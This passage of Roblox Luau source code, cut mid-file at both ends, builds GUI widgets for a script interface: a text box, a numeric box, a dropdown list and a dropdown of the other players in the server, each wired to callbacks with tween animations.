				Textbox.Size = UDim2.new(0.996690273, 0, 0.143, 0);
				Textbox.BorderSizePixel = 0;
				Textbox.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local UIGradient_1: UIGradient = Instance.new('UIGradient', Textbox);
				UIGradient_1.Color = ColorSequence.new{
					ColorSequenceKeypoint.new(0, Color3.fromRGB(47, 47, 47)),
					ColorSequenceKeypoint.new(1, Color3.fromRGB(56, 56, 56))
				};
				UIGradient_1.Rotation = -60;


				local UICorner_4: UICorner = Instance.new('UICorner', Textbox);
				UICorner_4.CornerRadius = UDim.new(0, 4);


				local TextLabel_1: TextLabel = Instance.new('TextLabel', Textbox);
				TextLabel_1.TextWrapped = true;
				TextLabel_1.TextColor3 = Color3.fromRGB(255, 255, 255);
				TextLabel_1.BorderColor3 = Color3.fromRGB(0, 0, 0);
				TextLabel_1.Text = 'ButtonHolder';
				TextLabel_1.Size = UDim2.new(0.831852794, 0, 0.646, 0);
				TextLabel_1.Position = UDim2.new(0.038410999, 0, 0.172, 0);
				TextLabel_1.BorderSizePixel = 0;
				TextLabel_1.BackgroundTransparency = 1;
				TextLabel_1.TextXAlignment = Enum.TextXAlignment.Left;
				TextLabel_1.TextSize = 14;
				TextLabel_1.FontFace = Font.new('rbxassetid://16658221428', Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
				TextLabel_1.TextScaled = true;
				TextLabel_1.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local TextBox: TextBox = Instance.new('TextBox', Textbox);
				TextBox.FontFace = Font.new('rbxassetid://16658221428', Enum.FontWeight.Medium, Enum.FontStyle.Normal);
				TextBox.TextColor3 = Color3.fromRGB(255, 255, 255);
				TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0);
				TextBox.Text = '';
				TextBox.Size = UDim2.new(0.264340192, 0, 0.66, 0);
				TextBox.BackgroundTransparency = 1;
				TextBox.Position = UDim2.new(0.709729612, 0, 0.158, 0);
				TextBox.BorderSizePixel = 0;
				TextBox.PlaceholderText = 'Enter';
				TextBox.TextSize = 14;
				TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local UIStroke: UIStroke = Instance.new('UIStroke', TextBox);
				UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border;
				UIStroke.Color = Color3.fromRGB(255, 255, 255);


				local UICorner_5: UICorner = Instance.new('UICorner', TextBox);
				UICorner_5.CornerRadius = UDim.new(0, 4);
			end
			Textbox.Name = title.."_TextBox"
			Textbox.TextLabel.Text = title or [[]]
			Textbox.Visible = true
			Textbox.Parent = TabC
			Textbox.TextBox.Text = default or ""
			local Last = Textbox.TextBox.Text
			Textbox.TextBox:GetPropertyChangedSignal("Text"):Connect(function()
					cb(Textbox.TextBox.Text)
			end)
			Textbox.TextBox.FocusLost:Connect(function()
				Last = Textbox.TextBox.Text
			end)
			Textbox.TextBox.Focused:Connect(function()
			    cb(Textbox.TextBox.Text)
				Textbox.TextBox.Text = Last
			end)
		    end)
		end
		--<< NUMBERBOX >>--
		function section.newNumberBox(title, default, cb)
		    task.defer(function() 
			local TabC = Tabs[titleTab.."_sb"]
			local Numberbox: Frame = Instance.new('Frame', TabC);
			do

				Numberbox.Visible = false;
				Numberbox.Name = 'Numberbox';
				Numberbox.Position = UDim2.new(-7.5e-08, 0, 0, 0);
				Numberbox.BorderColor3 = Color3.fromRGB(0, 0, 0);
				Numberbox.Size = UDim2.new(0.996690273, 0, 0.143, 0);
				Numberbox.BorderSizePixel = 0;
				Numberbox.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local UIGradient: UIGradient = Instance.new('UIGradient', Numberbox);
				UIGradient.Color = ColorSequence.new{
					ColorSequenceKeypoint.new(0, Color3.fromRGB(47, 47, 47)),
					ColorSequenceKeypoint.new(1, Color3.fromRGB(56, 56, 56))
				};
				UIGradient.Rotation = -60;


				local UICorner: UICorner = Instance.new('UICorner', Numberbox);
				UICorner.CornerRadius = UDim.new(0, 4);


				local TextLabel: TextLabel = Instance.new('TextLabel', Numberbox);
				TextLabel.TextWrapped = true;
				TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255);
				TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0);
				TextLabel.Text = 'ButtonHolder';
				TextLabel.Size = UDim2.new(0.831852794, 0, 0.646, 0);
				TextLabel.Position = UDim2.new(0.038410999, 0, 0.172, 0);
				TextLabel.BorderSizePixel = 0;
				TextLabel.BackgroundTransparency = 1;
				TextLabel.TextXAlignment = Enum.TextXAlignment.Left;
				TextLabel.TextSize = 14;
				TextLabel.FontFace = Font.new('rbxassetid://16658221428', Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
				TextLabel.TextScaled = true;
				TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local TextBox: TextBox = Instance.new('TextBox', Numberbox);
				TextBox.FontFace = Font.new('rbxassetid://16658221428', Enum.FontWeight.Medium, Enum.FontStyle.Normal);
				TextBox.TextColor3 = Color3.fromRGB(255, 255, 255);
				TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0);
				TextBox.Text = '';
				TextBox.Size = UDim2.new(0.264340192, 0, 0.66, 0);
				TextBox.BackgroundTransparency = 1;
				TextBox.Position = UDim2.new(0.709729612, 0, 0.158, 0);
				TextBox.BorderSizePixel = 0;
				TextBox.PlaceholderText = 'Enter';
				TextBox.TextSize = 14;
				TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local UICorner: UICorner = Instance.new('UICorner', TextBox);
				UICorner.CornerRadius = UDim.new(0, 4);


				local UIStroke: UIStroke = Instance.new('UIStroke', TextBox);
				UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border;
				UIStroke.Color = Color3.fromRGB(255, 255, 255);
			end

			
			Numberbox.Name = title.."_TextBox"
			Numberbox.TextLabel.Text = title or [[]]
			Numberbox.Visible = true
			Numberbox.Parent = TabC
			Numberbox.TextBox.Text = default or ""
			local Last = Numberbox.TextBox.Text
			Numberbox.TextBox:GetPropertyChangedSignal("Text"):Connect(function()
				local newText = string.gsub(Numberbox.TextBox.Text, "%D", "")
				if newText ~= Numberbox.TextBox.Text then
					Numberbox.TextBox.Text = newText
					cb(Numberbox.TextBox.Text)
				end
			end)
			Numberbox.TextBox.FocusLost:Connect(function()
				Last = Numberbox.TextBox.Text
			end)
			Numberbox.TextBox.Focused:Connect(function()
				Numberbox.TextBox.Text = Last
			end)
			end)
		end
		--<< DROPDOWN >>--
		function section.newDropdown(title,default,listTable,cb)
task.defer(function() 
			local Dropdown= {}
			local TabC = Tabs[titleTab.."_sb"]
			local newdd = Instance.new('Frame', TabC);
			do

				newdd.Name = 'DropDown';
				newdd.BackgroundTransparency = 1;
				newdd.Position = UDim2.new(-0.029547377, 0, 0.127, 0);
				newdd.BorderColor3 = Color3.fromRGB(0, 0, 0);
				newdd.Size =UDim2.new(0.997, 0, 0.143, 0);
				newdd.BorderSizePixel = 0;
				newdd.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local DropDownMain: TextButton = Instance.new('TextButton', newdd);
				DropDownMain.Active = false;
				DropDownMain.TextTransparency = 1;
				DropDownMain.Text = '';
				DropDownMain.Name = 'DropDownMain';
				DropDownMain.Size = UDim2.new(0.997759402, 0, 0, 37);
				DropDownMain.Selectable = false;
				DropDownMain.BorderColor3 = Color3.fromRGB(0, 0, 0);
				DropDownMain.BorderSizePixel = 0;
				DropDownMain.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local UIGradient_5: UIGradient = Instance.new('UIGradient', DropDownMain);
				UIGradient_5.Color = ColorSequence.new{
					ColorSequenceKeypoint.new(0, Color3.fromRGB(47, 47, 47)),
					ColorSequenceKeypoint.new(1, Color3.fromRGB(56, 56, 56))
				};
				UIGradient_5.Rotation = -60;


				local UICorner_11: UICorner = Instance.new('UICorner', DropDownMain);
				UICorner_11.CornerRadius = UDim.new(0, 4);


				local ImageLabel_1: ImageLabel = Instance.new('ImageLabel', DropDownMain);
				ImageLabel_1.ScaleType = Enum.ScaleType.Fit;
				ImageLabel_1.BorderColor3 = Color3.fromRGB(0, 0, 0);
				ImageLabel_1.Size = UDim2.new(0.061761726, 0, 0.66, 0);
				ImageLabel_1.Position = UDim2.new(0.947579503, 0, 0.483, 0);
				ImageLabel_1.AnchorPoint = Vector2.new(0.5, 0.5);
				ImageLabel_1.Image = 'rbxassetid://16167593004';
				ImageLabel_1.BackgroundTransparency = 1;
				ImageLabel_1.ImageRectSize = Vector2.new(108, 108);
				ImageLabel_1.BorderSizePixel = 0;
				ImageLabel_1.ImageRectOffset = Vector2.new(578, 0);
				ImageLabel_1.AutomaticSize = Enum.AutomaticSize.XY;
				ImageLabel_1.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local SelectionFrame: Frame = Instance.new('Frame', DropDownMain);
				SelectionFrame.Visible = false;
				SelectionFrame.Name = 'SelectionFrame';
				SelectionFrame.Position = UDim2.new(0, 0, 0.9, 0);
				SelectionFrame.BorderColor3 = Color3.fromRGB(0, 0, 0);
				SelectionFrame.Size = UDim2.new(1, 0, 0, 0);
				SelectionFrame.BorderSizePixel = 0;
				SelectionFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local UIGradient_6: UIGradient = Instance.new('UIGradient', SelectionFrame);
				UIGradient_6.Color = ColorSequence.new{
					ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 45, 45)),
					ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 50, 50))
				};
				UIGradient_6.Rotation = 94;


				local UICorner_12: UICorner = Instance.new('UICorner', SelectionFrame);
				UICorner_12.CornerRadius = UDim.new(0, 5);


				local BODY: ScrollingFrame = Instance.new('ScrollingFrame', SelectionFrame);
				BODY.Active = true;
				BODY.AutomaticCanvasSize = Enum.AutomaticSize.Y;
				BODY.ScrollBarThickness = 1;
				BODY.Name = 'BODY';
				BODY.AnchorPoint = Vector2.new(0.5, 0.5);
				BODY.Size = UDim2.new(0.956071496, 0, 0.879, 0);
				BODY.BackgroundTransparency = 1;
				BODY.Position = UDim2.new(0.5, 0, 0.5, 0);
				BODY.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
				BODY.BorderColor3 = Color3.fromRGB(0, 0, 0);
				BODY.BorderSizePixel = 0;
				BODY.CanvasSize = UDim2.new(0, 0, 0, 0);


				local UIPadding_1: UIPadding = Instance.new('UIPadding', BODY);
				UIPadding_1.PaddingLeft = UDim.new(0, 12);
				UIPadding_1.PaddingRight = UDim.new(0, 12);


				local UIListLayout_3: UIListLayout = Instance.new('UIListLayout', BODY);
				UIListLayout_3.Padding = UDim.new(0, 5);
				UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder;


				local TextLabel_6: TextLabel = Instance.new('TextLabel', DropDownMain);
				TextLabel_6.TextWrapped = true;
				TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255);
				TextLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0);
				TextLabel_6.Text = 'DropdownHolder';
				TextLabel_6.Size = UDim2.new(0.831852794, 0, 0.646, 0);
				TextLabel_6.Position = UDim2.new(0.038410999, 0, 0.172, 0);
				TextLabel_6.BorderSizePixel = 0;
				TextLabel_6.BackgroundTransparency = 1;
				TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left;
				TextLabel_6.TextSize = 14;
				TextLabel_6.FontFace = Font.new('rbxassetid://16658221428', Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
				TextLabel_6.TextScaled = true;
				TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local Selecte: TextLabel = Instance.new('TextLabel', DropDownMain);
				Selecte.TextWrapped = true;
				Selecte.Name = 'Selecte';
				Selecte.TextColor3 = Color3.fromRGB(130, 130, 130);
				Selecte.BorderColor3 = Color3.fromRGB(0, 0, 0);
				Selecte.Text = 'nil';
				Selecte.Size = UDim2.new(0.248821944, 0, 0.487, 0);
				Selecte.Position = UDim2.new(0.65, 0, 0.25, 0);
				Selecte.BorderSizePixel = 0;
				Selecte.TextScaled = true;
				Selecte.BackgroundTransparency = 1;
				Selecte.TextXAlignment = Enum.TextXAlignment.Right;
				Selecte.FontFace = Font.new('rbxassetid://16658221428', Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
				Selecte.TextYAlignment = Enum.TextYAlignment.Center;
				Selecte.TextSize = 16;
				Selecte.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local UIAspectRatioConstraint: UIAspectRatioConstraint = Instance.new('UIAspectRatioConstraint', DropDownMain);
				UIAspectRatioConstraint.AspectRatio = 10.919;
			end
			newdd.Visible = true
			newdd.Parent = TabC
			newdd.Name = title
			newdd.DropDownMain.TextLabel.Text = title
			newdd.DropDownMain.Selecte.Text = default or [[]]
			if default ~= nil and listTable[default] ~= nil then
				cb(default)
			end
			local	function UIGradientDisable(ObjName)
				for i,v in pairs(newdd.DropDownMain.SelectionFrame.BODY:GetChildren()) do
					if v:IsA("GuiButton") and v.Name ~= ObjName then
						v.UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(22, 22, 22)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(35, 35, 35))};
						--	v.TextLabel.TextColor3 = Color3.fromRGB(255,255,255)
						game.TweenService:Create(v.TextLabel, TweenInfo.new(0.5), {TextColor3 = Color3.fromRGB(255,255,255)}):Play()
					end
				end
			end
			local function Update()
				for i,v in pairs(newdd.DropDownMain.SelectionFrame.BODY:GetChildren()) do
					if v.ClassName == "TextButton" then v:Destroy() end end
				for i, list in ipairs(listTable) do
					local newddbtn: TextButton = Instance.new('TextButton');
					do

						newddbtn.Visible = false;
						newddbtn.Active = false;
						newddbtn.TextTransparency = 1;
						newddbtn.Text = '';
						newddbtn.Name = 'DropDownButton';
						newddbtn.Size = UDim2.new(0.996690333, 0, 0.3, 0);
						newddbtn.Selectable = false;
						newddbtn.BorderColor3 = Color3.fromRGB(0, 0, 0);
						newddbtn.BorderSizePixel = 0;
						newddbtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


						local UIGradient_3: UIGradient = Instance.new('UIGradient', newddbtn);
						UIGradient_3.Color = ColorSequence.new{
							ColorSequenceKeypoint.new(0, Color3.fromRGB(21, 21, 21)),
							ColorSequenceKeypoint.new(1, Color3.fromRGB(34, 34, 34))
						};
						UIGradient_3.Rotation = -60;


						local UICorner_7: UICorner = Instance.new('UICorner', newddbtn);
						UICorner_7.CornerRadius = UDim.new(0, 4);


						local TextLabel_3: TextLabel = Instance.new('TextLabel', newddbtn);
						TextLabel_3.TextWrapped = true;
						TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255);
						TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0);
						TextLabel_3.Text = 'ButtonHolder';
						TextLabel_3.Size = UDim2.new(0.929452837, 0, 0.646, 0);
						TextLabel_3.Position = UDim2.new(0.038410883, 0, 0.172, 0);
						TextLabel_3.BorderSizePixel = 0;
						TextLabel_3.BackgroundTransparency = 1;
						TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left;
						TextLabel_3.TextSize = 14;
						TextLabel_3.FontFace = Font.new('rbxassetid://16658221428', Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
						TextLabel_3.TextScaled = true;
						TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
					end
					newddbtn.Visible = true
					newddbtn.Parent = newdd.DropDownMain.SelectionFrame.BODY
					newddbtn.Name = list
					newddbtn.TextLabel.Text = list

					task.spawn(function()
						newddbtn.MouseButton1Click:Connect(function()
							print(list)

							game.TweenService:Create(newddbtn.TextLabel, TweenInfo.new(0.5), {TextColor3 = Color3.fromRGB(0,0,0)}):Play()
							--	newddbtn.TextLabel.TextColor3 = Color3.fromRGB(0,0,0)
							newddbtn.UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(249, 249, 249)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(240, 240, 240))}
							newdd.DropDownMain.Selecte.Text = list
							UIGradientDisable(newddbtn.Name)
							cb(list)
						end)
					end)
				end		
			end


			for i, list in ipairs(listTable) do
				local newddbtn: TextButton = Instance.new('TextButton');
				do

					newddbtn.Visible = false;
					newddbtn.Active = false;
					newddbtn.TextTransparency = 1;
					newddbtn.Text = '';
					newddbtn.Name = 'DropDownButton';
					newddbtn.Size = UDim2.new(0.996690333, 0, 0.3, 0);
					newddbtn.Selectable = false;
					newddbtn.BorderColor3 = Color3.fromRGB(0, 0, 0);
					newddbtn.BorderSizePixel = 0;
					newddbtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


					local UIGradient_3: UIGradient = Instance.new('UIGradient', newddbtn);
					UIGradient_3.Color = ColorSequence.new{
						ColorSequenceKeypoint.new(0, Color3.fromRGB(21, 21, 21)),
						ColorSequenceKeypoint.new(1, Color3.fromRGB(34, 34, 34))
					};
					UIGradient_3.Rotation = -60;


					local UICorner_7: UICorner = Instance.new('UICorner', newddbtn);
					UICorner_7.CornerRadius = UDim.new(0, 4);


					local TextLabel_3: TextLabel = Instance.new('TextLabel', newddbtn);
					TextLabel_3.TextWrapped = true;
					TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255);
					TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0);
					TextLabel_3.Text = 'ButtonHolder';
					TextLabel_3.Size = UDim2.new(0.929452837, 0, 0.646, 0);
					TextLabel_3.Position = UDim2.new(0.038410883, 0, 0.172, 0);
					TextLabel_3.BorderSizePixel = 0;
					TextLabel_3.BackgroundTransparency = 1;
					TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left;
					TextLabel_3.TextSize = 14;
					TextLabel_3.FontFace = Font.new('rbxassetid://16658221428', Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
					TextLabel_3.TextScaled = true;
					TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
				end
				newddbtn.Visible = true
				newddbtn.Parent = newdd.DropDownMain.SelectionFrame.BODY
				newddbtn.Name = list
				newddbtn.TextLabel.Text = list

				task.spawn(function()
					newddbtn.MouseButton1Click:Connect(function()
						print(list)

						game.TweenService:Create(newddbtn.TextLabel, TweenInfo.new(0.5), {TextColor3 = Color3.fromRGB(0,0,0)}):Play()
						--	newddbtn.TextLabel.TextColor3 = Color3.fromRGB(0,0,0)
						newddbtn.UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(249, 249, 249)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(240, 240, 240))}
						newdd.DropDownMain.Selecte.Text = list
						UIGradientDisable(newddbtn.Name)
						cb(list)
					end)
				end)
			end		
			function Dropdown:Add(Config)
				if table.find(listTable,Config.Value) ~= nil then return end
				table.insert(listTable,Config.Sort or 1,Config.Value)
				Update()
			end

			function Dropdown:Remove(Config)
				if table.find(listTable,Config.Value) == nil then return end
				table.remove(listTable,Config.Sort or 1)
				Update()
			end

			newdd.DropDownMain.MouseButton1Click:Connect(function()
				newdd.DropDownMain.Interactable = false
				if newdd.DropDownMain.SelectionFrame.Visible == false then

					newdd.DropDownMain.SelectionFrame.Visible = true
					game.TweenService:Create(newdd.DropDownMain.ImageLabel, TweenInfo.new(0.15), {Rotation = 180}):Play()
					local twPos = game.TweenService:Create(newdd.DropDownMain.SelectionFrame, TweenInfo.new(.5), {Size = UDim2.new(1, 0,3.75, 0)})
					twPos:Play()
					game.TweenService:Create(newdd, TweenInfo.new(.5), {Size = UDim2.new(1, 0,.65, 0)}):Play()
					twPos.Completed:Wait()
					newdd.DropDownMain.SelectionFrame.Size = UDim2.new(1, 0, 3.75, 0);
				elseif newdd.DropDownMain.SelectionFrame.Visible == true then
					game.TweenService:Create(newdd.DropDownMain.ImageLabel, TweenInfo.new(0.15), {Rotation = 0}):Play()
					local twPos = game.TweenService:Create(newdd.DropDownMain.SelectionFrame, TweenInfo.new(.5), {Size = UDim2.new(1, 0, 0, 0)})
					twPos:Play()
					game.TweenService:Create(newdd, TweenInfo.new(.5), {Size = UDim2.new(0.997, 0, 0.143, 0)}):Play()

					twPos.Completed:Wait()
					newdd.DropDownMain.SelectionFrame.Visible = false
					newdd.DropDownMain.SelectionFrame.Size = UDim2.new(1, 0, 0, 0);
				end
				newdd.DropDownMain.Interactable = true
			end)
			return Dropdown
			end)
		end
	
		--<< PLAYER DROPDOWN >>--
		function section.newPlayer_Dropdown(title,cb)
		    task.defer(function() 
			local TabC = Tabs[titleTab.."_sb"]
			local newdd = Instance.new('Frame', TabC);
			do



				newdd.Name = 'DropDown';
				newdd.BackgroundTransparency = 1;
				newdd.Position = UDim2.new(-0.029547377, 0, 0.127, 0);
				newdd.BorderColor3 = Color3.fromRGB(0, 0, 0);
				newdd.Size =UDim2.new(0.997, 0, 0.143, 0);
				newdd.BorderSizePixel = 0;
				newdd.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local DropDownMain: TextButton = Instance.new('TextButton', newdd);
				DropDownMain.Active = false;
				DropDownMain.TextTransparency = 1;
				DropDownMain.Text = '';
				DropDownMain.Name = 'DropDownMain';
				DropDownMain.Size = UDim2.new(0.997759402, 0, 0, 37);
				DropDownMain.Selectable = false;
				DropDownMain.BorderColor3 = Color3.fromRGB(0, 0, 0);
				DropDownMain.BorderSizePixel = 0;
				DropDownMain.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local UIGradient_5: UIGradient = Instance.new('UIGradient', DropDownMain);
				UIGradient_5.Color = ColorSequence.new{
					ColorSequenceKeypoint.new(0, Color3.fromRGB(47, 47, 47)),
					ColorSequenceKeypoint.new(1, Color3.fromRGB(56, 56, 56))
				};
				UIGradient_5.Rotation = -60;


				local UICorner_11: UICorner = Instance.new('UICorner', DropDownMain);
				UICorner_11.CornerRadius = UDim.new(0, 4);


				local ImageLabel_1: ImageLabel = Instance.new('ImageLabel', DropDownMain);
				ImageLabel_1.ScaleType = Enum.ScaleType.Fit;
				ImageLabel_1.BorderColor3 = Color3.fromRGB(0, 0, 0);
				ImageLabel_1.Size = UDim2.new(0.061761726, 0, 0.66, 0);
				ImageLabel_1.Position = UDim2.new(0.947579503, 0, 0.483, 0);
				ImageLabel_1.AnchorPoint = Vector2.new(0.5, 0.5);
				ImageLabel_1.Image = 'rbxassetid://16167593004';
				ImageLabel_1.BackgroundTransparency = 1;
				ImageLabel_1.ImageRectSize = Vector2.new(108, 108);
				ImageLabel_1.BorderSizePixel = 0;
				ImageLabel_1.ImageRectOffset = Vector2.new(578, 0);
				ImageLabel_1.AutomaticSize = Enum.AutomaticSize.XY;
				ImageLabel_1.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local SelectionFrame: Frame = Instance.new('Frame', DropDownMain);
				SelectionFrame.Visible = false;
				SelectionFrame.Name = 'SelectionFrame';
				SelectionFrame.Position = UDim2.new(0, 0, 0.9, 0);
				SelectionFrame.BorderColor3 = Color3.fromRGB(0, 0, 0);
				SelectionFrame.Size = UDim2.new(1, 0, 0, 0);
				SelectionFrame.BorderSizePixel = 0;
				SelectionFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local UIGradient_6: UIGradient = Instance.new('UIGradient', SelectionFrame);
				UIGradient_6.Color = ColorSequence.new{
					ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 45, 45)),
					ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 50, 50))
				};
				UIGradient_6.Rotation = 94;


				local UICorner_12: UICorner = Instance.new('UICorner', SelectionFrame);
				UICorner_12.CornerRadius = UDim.new(0, 5);


				local BODY: ScrollingFrame = Instance.new('ScrollingFrame', SelectionFrame);
				BODY.Active = true;
				BODY.AutomaticCanvasSize = Enum.AutomaticSize.Y;
				BODY.ScrollBarThickness = 1;
				BODY.Name = 'BODY';
				BODY.AnchorPoint = Vector2.new(0.5, 0.5);
				BODY.Size = UDim2.new(0.956071496, 0, 0.879, 0);
				BODY.BackgroundTransparency = 1;
				BODY.Position = UDim2.new(0.5, 0, 0.5, 0);
				BODY.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
				BODY.BorderColor3 = Color3.fromRGB(0, 0, 0);
				BODY.BorderSizePixel = 0;
				BODY.CanvasSize = UDim2.new(0, 0, 0, 0);


				local UIPadding_1: UIPadding = Instance.new('UIPadding', BODY);
				UIPadding_1.PaddingLeft = UDim.new(0, 12);
				UIPadding_1.PaddingRight = UDim.new(0, 12);


				local UIListLayout_3: UIListLayout = Instance.new('UIListLayout', BODY);
				UIListLayout_3.Padding = UDim.new(0, 5);
				UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder;


				local TextLabel_6: TextLabel = Instance.new('TextLabel', DropDownMain);
				TextLabel_6.TextWrapped = true;
				TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255);
				TextLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0);
				TextLabel_6.Text = 'DropdownHolder';
				TextLabel_6.Size = UDim2.new(0.831852794, 0, 0.646, 0);
				TextLabel_6.Position = UDim2.new(0.038410999, 0, 0.172, 0);
				TextLabel_6.BorderSizePixel = 0;
				TextLabel_6.BackgroundTransparency = 1;
				TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left;
				TextLabel_6.TextSize = 14;
				TextLabel_6.FontFace = Font.new('rbxassetid://16658221428', Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
				TextLabel_6.TextScaled = true;
				TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local Selecte: TextLabel = Instance.new('TextLabel', DropDownMain);
				Selecte.TextWrapped = true;
				Selecte.Name = 'Selecte';
				Selecte.TextColor3 = Color3.fromRGB(130, 130, 130);
				Selecte.BorderColor3 = Color3.fromRGB(0, 0, 0);
				Selecte.Text = '';
				Selecte.Size = UDim2.new(0.248821944, 0, 0.487, 0);
				Selecte.Position = UDim2.new(0.65, 0, 0.25, 0);
				Selecte.BorderSizePixel = 0;
				Selecte.TextScaled = true;
				Selecte.BackgroundTransparency = 1;
				Selecte.TextXAlignment = Enum.TextXAlignment.Right;
				Selecte.FontFace = Font.new('rbxassetid://16658221428', Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
				Selecte.TextYAlignment = Enum.TextYAlignment.Center;
				Selecte.TextSize = 16;
				Selecte.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local UIAspectRatioConstraint: UIAspectRatioConstraint = Instance.new('UIAspectRatioConstraint', DropDownMain);
				UIAspectRatioConstraint.AspectRatio = 10.919;
			end
			newdd.Visible = true
			newdd.Parent = TabC
			newdd.Name = title
			newdd.DropDownMain.TextLabel.Text = title
			function Update()
			    
				for i,v in pairs(newdd.DropDownMain.SelectionFrame.BODY:GetChildren()) do
					if v.ClassName == "TextButton" then v:Destroy() end end


				for _,list in pairs(game.Players:GetPlayers()) do
					if list.Name ~= game.Players.LocalPlayer.Name then
						local DropDownButton: TextButton = Instance.new('TextButton')
						do
							
							
							DropDownButton.Active = false;
							DropDownButton.TextTransparency = 1;
							DropDownButton.Text = '';
							DropDownButton.Name = 'DropDownButton';
							DropDownButton.Size = UDim2.new(0.996690333, 0, 0.3, 0);
							DropDownButton.Selectable = false;
							DropDownButton.BorderColor3 = Color3.fromRGB(0, 0, 0);
							DropDownButton.BorderSizePixel = 0;
							DropDownButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


							local UIGradient_3: UIGradient = Instance.new('UIGradient', DropDownButton);
							UIGradient_3.Color = ColorSequence.new{
								ColorSequenceKeypoint.new(0, Color3.fromRGB(21, 21, 21)),
								ColorSequenceKeypoint.new(1, Color3.fromRGB(34, 34, 34))
							};
							UIGradient_3.Rotation = -60;


							local UICorner_7: UICorner = Instance.new('UICorner', DropDownButton);
							UICorner_7.CornerRadius = UDim.new(0, 4);


							local TextLabel_3: TextLabel = Instance.new('TextLabel', DropDownButton);
							TextLabel_3.TextWrapped = true;
							TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255);
							TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0);
							TextLabel_3.Text = 'ButtonHolder';
							TextLabel_3.Size = UDim2.new(0.929452837, 0, 0.646, 0);
							TextLabel_3.Position = UDim2.new(0.038410883, 0, 0.172, 0);
							TextLabel_3.BorderSizePixel = 0;
							TextLabel_3.BackgroundTransparency = 1;
							TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left;
							TextLabel_3.TextSize = 14;
							TextLabel_3.FontFace = Font.new('rbxassetid://16658221428', Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
							TextLabel_3.TextScaled = true;
							TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
						end

						
						DropDownButton.Visible = true
						DropDownButton.Parent = newdd.DropDownMain.SelectionFrame.BODY
						DropDownButton.Name = list.Name
						DropDownButton.TextLabel.Text = list.Name
						DropDownButton.MouseButton1Click:Connect(function()
							newdd.DropDownMain.Selecte.Text = list.Name
							game.TweenService:Create(newdd.DropDownMain.ImageLabel, TweenInfo.new(0.15), {Rotation = 0}):Play()
							local twPos = game.TweenService:Create(newdd, TweenInfo.new(0.15), {Size = UDim2.new(0.997, 0,0.143, 0)})
							twPos:Play()
							twPos.Completed:Wait()
							newdd.DropDownMain.SelectionFrame.Visible = false
							cb(list.Name)
						end)
					end
				end
			end
			Update()
			newdd.DropDownMain.MouseButton1Click:Connect(function()
Update()
				newdd.DropDownMain.Interactable = false

				if newdd.DropDownMain.SelectionFrame.Visible == false then

					newdd.DropDownMain.SelectionFrame.Visible = true
					game.TweenService:Create(newdd.DropDownMain.ImageLabel, TweenInfo.new(0.15), {Rotation = 180}):Play()
